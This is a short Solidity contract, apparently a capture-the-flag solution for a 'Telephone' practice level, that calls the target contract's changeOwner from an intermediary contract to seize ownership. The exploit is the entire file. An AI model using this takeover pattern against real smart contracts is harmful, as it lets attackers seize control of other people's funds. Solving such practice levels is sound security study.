// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import 'levels/Telephone.sol';

contract TelephoneHack {
  Telephone public telephone;

  constructor(address telephoneAddress) {
    telephone = Telephone(telephoneAddress);
  }

  function hack() external {
    telephone.changeOwner(msg.sender);
  }
}
